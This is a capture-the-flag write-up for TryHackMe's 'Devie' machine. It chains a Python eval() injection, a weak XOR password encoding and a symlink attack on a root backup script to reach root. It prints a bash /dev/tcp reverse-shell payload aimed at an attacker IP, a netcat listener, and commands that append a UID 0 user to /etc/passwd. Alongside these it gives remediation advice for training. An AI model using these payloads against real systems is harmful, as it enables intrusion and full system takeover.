# TryHackMe – Devie | Linux Pentesting & Privilege Escalation

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)
![OS](https://img.shields.io/badge/OS-Ubuntu-orange)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow)
![Category](https://img.shields.io/badge/Category-Linux%20Privilege%20Escalation-blue)

## Machine Information

| Attribute | Details |
|---|---|
| Machine | Devie |
| Platform | TryHackMe |
| Difficulty | Medium |
| Operating System | Linux |
| Target IP | `10.49.169.166` |
| Initial User | `bruce` |
| Intermediate User | `gordon` |
| Root Access | `naval` (UID 0) |

**Machine Hint:** Don't trust what you see.

## 1. Enumeration

We begin by identifying all open TCP ports on the target machine.

### Full Port Scan

```bash
nmap -p- 10.49.169.166
```

**Results:**

```text
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```

Only two TCP ports were discovered.

### Service and Version Detection

Next, we perform service and version detection to identify the applications running on the discovered ports.

```bash
nmap -sC -sV -p22,5000 10.49.169.166
```

**Results:**

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
5000/tcp open  http    Werkzeug httpd 2.1.2 (Python 3.8.10)
```

The service scan reveals:

- Port 22: OpenSSH running on Ubuntu.
- Port 5000: A Python web application running through Werkzeug.

The HTTP title is **Math**.

The unusual application and its source code become our next investigation targets.

## 2. Web Application Enumeration

We navigate to:

```text
http://10.49.169.166:5000
```

The application provides mathematical calculations. At the bottom of the page, we discover an option to download its source code.

After downloading `source.zip`, we extract its contents.

```bash
unzip source.zip
```

Extracted structure:

```text
math/
├── app.py
├── quadratic.py
├── bisection.py
├── prime.py
└── templates/
    └── index.html
```

### Source Code Analysis

Rather than blindly testing common web vulnerabilities, we inspect the application logic.

```bash
grep -Rni "eval" math/
```

During source code analysis, we identify Python's `eval()` function being used to process user-controlled mathematical input.

This is a critical finding.

Python's `eval()` dynamically evaluates Python expressions. When untrusted input reaches it without proper validation or restriction, an attacker may be able to execute arbitrary Python code.

Reference: [Hacking Python Applications](https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1)

## 3. Initial Access – Python Code Execution

We use Burp Suite to intercept a calculation request from the Bisection method.

Instead of submitting a normal mathematical expression, we test whether the input parameter can execute Python code.

The vulnerable parameter is `xa`.

### Reverse Shell Payload

We use Python's `os` module to execute a Bash reverse shell.

```python
__import__('os').system(
    'bash -c "bash -i >& /dev/tcp/192.168.136.156/9001 0>&1"'
)
```

The corresponding URL-encoded request parameter is:

```text
xa=__import__('os').system('bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.136.156%2F9001%200%3E%261%22')&xb=2
```

Replace `192.168.136.156` with your own TryHackMe VPN interface IP.

### Start the Netcat Listener

On our attacking machine:

```bash
nc -lvnp 9001
```

After submitting the modified request, we receive a reverse shell.

```text
listening on [any] 9001 ...
connect to [192.168.136.156] from (UNKNOWN) [10.49.169.166]
bash: cannot set terminal process group
bash: no job control in this shell

bruce@ip-10-49-169-166:~$
```

**Initial access obtained as `bruce`.**

### Stabilizing the Shell

We first verify that Python 3 is available.

```bash
which python3
```

Spawn a more interactive shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then, from our local terminal:

```bash
Ctrl + Z
stty raw -echo
fg
```

Press Enter if required, and configure the terminal:

```bash
export TERM=xterm-256color
```

We now have a more stable interactive shell.

## 4. First Privilege Escalation – Bruce to Gordon

After gaining access, we enumerate the home directory.

```bash
ls -la
```

We discover:

```text
checklist
flag1.txt
note
```

Reading the note:

```bash
cat note
```

The note contains an interesting message from Gordon:

```text
Hello Bruce,

I have encoded my password using the super secure XOR format.

I made the key quite lengthy and spiced it up with some base64 at the end to make it even more secure. I'll share the decoding script for it soon. However, you can use my script located in the /opt/ directory.

For now look at this super secure string:

NEUEDTIeN1MRDg5K

Gordon
```

This gives us two important pieces of information:

1. Gordon's password has been XOR encoded.
2. An encryption script exists under `/opt/`.

### Checking Sudo Permissions

We enumerate the commands available through sudo.

```bash
sudo -l
```

Output:

```text
User bruce may run the following commands on ip-10-49-169-166:

(gordon) NOPASSWD: /usr/bin/python3 /opt/encrypt.py
```

This tells us that Bruce can execute a specific Python script as Gordon without knowing Gordon's password.

### Investigating the Encryption Script

We execute the permitted command:

```bash
sudo -u gordon /usr/bin/python3 /opt/encrypt.py
```

The script asks for a password to encrypt.

We provide the string found in Gordon's note:

```text
NEUEDTIeN1MRDg5K
```

The output is:

```text
PTAlIDYnLAY8VDk5IR5NJA==
```

Next, we provide a longer known plaintext:

```text
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

The script returns:

```text
EhQRBBMSBAITBBUKBBgZDhMZDhMSFBEEExIEAhMEFQoEGBkOExkOExI=
```

This gives us an opportunity to investigate the XOR encryption mechanism.

### Breaking the XOR Encoding

We use CyberChef to analyze the encryption.

The process is:

1. Decode the Base64 output.
2. Apply XOR using the appropriate UTF-8 key.
3. Analyze the known plaintext and corresponding ciphertext to recover the repeating XOR key.
4. Apply the recovered key to Gordon's original encoded password.

The recovered XOR key is:

```text
supersecretkeyxorxorsupersecretkeyxorxors
```

Decrypting the original string gives us Gordon's password:

```text
G0th@mR0ckz!
```

### Switching to Gordon

```bash
su gordon
```

Password:

```text
G0th@mR0ckz!
```

Verify the current user:

```bash
whoami
```

```text
gordon
```

We have successfully moved from Bruce to Gordon.

Retrieve the second flag:

```bash
cat ~/flag2.txt
```

## 5. Second Privilege Escalation – Gordon to Root

Now that we have Gordon's access, we begin enumerating scheduled processes and looking for opportunities to escalate privileges.

One useful tool for this is **pspy**, which allows us to observe processes without requiring root privileges.

### Transferring pspy

On our Kali machine, we navigate to the directory containing `pspy64` and start a temporary HTTP server.

```bash
python3 -m http.server 80
```

On the target machine, download the binary:

```bash
wget http://192.168.136.156/pspy64 -O /tmp/pspy64
```

Make it executable:

```bash
chmod +x /tmp/pspy64
```

Run it:

```bash
/tmp/pspy64
```

### Monitoring Background Processes

While monitoring the running processes, we discover an interesting command executing in the background:

```text
/bin/sh -c /usr/bin/bash /usr/bin/backup
```

The process information also indicates:

```text
UID=0
```

This means the backup script is being executed with root privileges.

This is particularly interesting because the script operates on files inside Gordon's home directory.

### Inspecting the Backup Script

We inspect the script:

```bash
cat /usr/bin/backup
```

The relevant operations include:

```bash
#!/bin/bash

cd /home/gordon/reports/

cp * /home/gordon/backups/
```

The script also appends a passwd-format user entry to:

```text
/home/gordon/reports/passwd
```

The entry observed during enumeration is:

```text
naval:$6$eEZqqrBwHGHO/Xun$TcuLtBIraRYkI8gHx4uhV.zyiGapYMZzT02PI4STnSNM8HjNzutZg/vkkbf70I3kpIzaLn9QlPXsnLvTiXRDM.:0:0:naval:/root:/bin/bash
```

The interesting part is the final operation:

```bash
echo 'naval:<SHA512-CRYPT-HASH>:0:0:naval:/root:/bin/bash' >> /home/gordon/reports/passwd
```

The script is writing a user entry into a file located in Gordon's reports directory.

Since the backup process runs as root and Gordon controls the directory, this introduces an opportunity for a symbolic link attack.

## 6. Exploiting the Symbolic Link Vulnerability

The key issue is that the backup script trusts the destination file without protecting against symbolic links.

Our objective is to make:

```text
/home/gordon/reports/passwd
```

a symbolic link pointing to:

```text
/etc/passwd
```

First, move into the reports directory.

```bash
cd /home/gordon/reports/
```

Remove an existing `passwd` file if necessary and create the symbolic link:

```bash
rm -f passwd
ln -s /etc/passwd passwd
```

Verify the link:

```bash
ls -l passwd
```

Expected result:

```text
passwd -> /etc/passwd
```

Now the backup script's append operation targets the real system password file through the symbolic link.

### Waiting for the Scheduled Backup

We wait for the root-owned backup process to execute again.

When it runs, the passwd-format entry is appended through the symbolic link into `/etc/passwd`.

We can verify the result:

```bash
tail -n 2 /etc/passwd
```

The newly added entry appears:

```text
ubuntu:x:1002:1003:Ubuntu:/home/ubuntu:/bin/bash
naval:$6$eEZqqrBwHGHO/Xun$TcuLtBIraRYkI8gHx4uhV.zyiGapYMZzT02PI4STnSNM8HjNzutZg/vkkbf70I3kpIzaLn9QlPXsnLvTiXRDM.:0:0:naval:/root:/bin/bash
```

Notice the important fields:

```text
UID = 0
GID = 0
Home Directory = /root
Shell = /bin/bash
```

A user with UID 0 has root-level privileges.

The password used to generate the SHA-512 crypt hash was:

```text
password
```

### Obtaining Root Access

We switch to the newly added user:

```bash
su naval
```

Enter:

```text
password
```

Verify our privileges:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

**Root access successfully obtained!**

## 7. Root Flag

Finally, we navigate to the root directory and retrieve the final flag.

```bash
cat /root/root.txt
```

```text
THM{INSERT_ROOT_FLAG_HERE}
```

---

## 8. Vulnerabilities Identified

| Stage | Vulnerability | Impact |
|---|---|---|
| Initial Access | Unsafe Python `eval()` | Arbitrary code execution |
| Bruce → Gordon | Weak XOR-based password encoding | Credential recovery |
| Gordon → Root | Insecure root-owned backup script | Privilege escalation through symbolic link |
| Final Access | Unauthorized UID 0 account creation | Complete system compromise |

## 9. Key Takeaways

This machine demonstrates how multiple seemingly unrelated weaknesses can be chained together to compromise an entire Linux system.

**1. Unsafe Dynamic Evaluation**

Never pass untrusted input directly into Python's `eval()`. Use safer parsing and explicitly validate acceptable expressions.

**2. Weak Encryption**

Base64 is an encoding mechanism, not encryption. Repeating-key XOR is also unsuitable for protecting passwords and sensitive data.

**3. Sudo Misconfiguration**

Always inspect permitted sudo commands carefully. A restricted command can still expose sensitive functionality or information.

**4. Insecure Scheduled Tasks**

Root-owned scripts should never blindly trust files or directories that can be modified by unprivileged users.

**5. Symbolic Link Attacks**

Writing to a predictable file path without safely handling symbolic links can result in unintended modification of privileged system files.

## 10. Remediation Recommendations

- Replace unsafe `eval()` usage with a safe mathematical expression parser.
- Never store passwords using reversible XOR encoding.
- Use secure password hashing algorithms such as Argon2id or bcrypt.
- Review sudo permissions and restrict privileged scripts.
- Ensure root-owned cron scripts use directories controlled exclusively by root.
- Validate file types and ownership before processing files.
- Prevent symbolic link traversal when handling privileged file operations.
- Avoid appending attacker-controlled data to sensitive system files such as `/etc/passwd`.

## Conclusion

Devie was a good demonstration of how application-level vulnerabilities, weak cryptographic practices, and Linux misconfigurations can combine into a complete compromise.

The most interesting part was the final privilege escalation: a root-owned backup routine trusted a file inside a user-controlled directory, allowing us to redirect its write operation through a symbolic link.

**Initial Access → Bruce → Gordon → Root**

Machine completed!

---

## Flags

| Flag | Value |
|---|---|
| User Flag | `INSERT_FLAG_1_HERE` |
| Second Flag | `INSERT_FLAG_2_HERE` |
| Root Flag | `INSERT_ROOT_FLAG_HERE` |

*Note: Replace the flag placeholders with the actual values captured during your session before publishing.*

# Jai Shri Ram
